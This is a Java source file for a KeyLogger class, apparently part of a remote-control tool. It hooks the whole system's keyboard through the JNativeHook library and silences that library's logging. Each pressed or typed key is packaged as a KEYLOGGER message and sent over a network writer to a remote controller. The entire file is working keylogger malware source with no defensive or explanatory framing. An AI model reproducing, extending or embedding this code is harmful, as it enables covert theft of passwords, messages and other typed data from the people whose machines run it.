package Control;

import Ultils.MessageType;
import Ultils.NetUtils;
import Ultils.Packet;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.PrintWriter;
import java.util.Arrays;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

public class KeyLogger implements NativeKeyListener {

    private final PrintWriter pw;

    public KeyLogger(PrintWriter pw) throws NativeHookException {
        GlobalScreen.registerNativeHook();
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        GlobalScreen.addNativeKeyListener(this);
        this.pw = pw;
        LogManager.getLogManager().reset();
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent arg0) {
        String text = NativeKeyEvent.getKeyText(arg0.getKeyCode());
        boolean changed = false;
        if (text.equals("Backspace")) {
            text = "Back";
            changed = true;
        }
        String chars = "abcdefghijklmnopqrstuvwxyz1234567890";
        boolean contains = false;
        try {
            for (char c : chars.toCharArray()) {
                if ((c + "").equals( (arg0.getKeyChar() + "").toLowerCase())) {
                    contains = true;
                }
            }
            if (!contains) {
                changed = true;
            } // lolol
        } catch (Exception e) {
            changed = true;
        }
        if (text.equals("Space") || text.equals("Shift")) {
            changed = true;
        }

        if (changed) {
            try {
                Packet packet = new Packet();
                packet.action = MessageType.KEYLOGGER.getID();
                packet.data = Arrays.asList(new String[] {text});
                NetUtils.sendMessage(packet, pw);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent arg0) {}

    @Override
    public void nativeKeyTyped(NativeKeyEvent arg0) {
        String text = arg0.getKeyChar() + "";
        if (!text.equals(" ")) {
            try {
                Packet packet = new Packet();
                packet.action = MessageType.KEYLOGGER.getID();
                packet.data = Arrays.asList(new String[] {text});
                NetUtils.sendMessage(packet, pw);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}